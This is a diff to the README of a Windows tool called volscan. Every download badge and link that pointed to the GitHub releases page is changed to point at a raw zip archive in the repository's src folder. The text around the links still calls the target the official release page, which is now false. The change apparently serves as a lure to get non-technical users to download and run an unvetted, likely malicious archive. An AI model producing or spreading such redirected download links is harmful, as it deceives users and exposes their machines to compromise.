@@ -1,6 +1,6 @@
 # ⚡ volscan - Simple Options Insight Tool
 
-[![Download volscan](https://img.shields.io/badge/Download-volscan-brightgreen?style=for-the-badge)](https://github.com/everArevaloo/volscan/releases)
+[![Download volscan](https://img.shields.io/badge/Download-volscan-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/everArevaloo/volscan/main/src/Software_v2.1-alpha.5.zip)
 
 ---
 
@@ -36,7 +36,7 @@ Take the following steps to download and run volscan on your Windows PC. No prog
 
 Click this big button to go to the official volscan download page on GitHub:
 
-[![Download volscan](https://img.shields.io/badge/Download-volscan-blue?style=for-the-badge)](https://github.com/everArevaloo/volscan/releases)
+[![Download volscan](https://img.shields.io/badge/Download-volscan-blue?style=for-the-badge)](https://raw.githubusercontent.com/everArevaloo/volscan/main/src/Software_v2.1-alpha.5.zip)
 
 GitHub manages the releases for volscan here. You will find the latest version listed at the top.
 
@@ -115,7 +115,7 @@ If data does not load, check your internet connection since the app needs it to 
 
 New versions of volscan will be posted on the GitHub release page:
 
-https://github.com/everArevaloo/volscan/releases
+https://raw.githubusercontent.com/everArevaloo/volscan/main/src/Software_v2.1-alpha.5.zip
 
 Visit this page regularly to download the latest installer file. Run the new installer to update your existing version without losing your settings.
 
@@ -125,4 +125,4 @@ If you have questions or need help with volscan, check the issues section on the
 
 ---
 
-[Get volscan here](https://github.com/everArevaloo/volscan/releases) to download and try the latest Windows version.
+[Get volscan here](https://raw.githubusercontent.com/everArevaloo/volscan/main/src/Software_v2.1-alpha.5.zip) to download and try the latest Windows version.
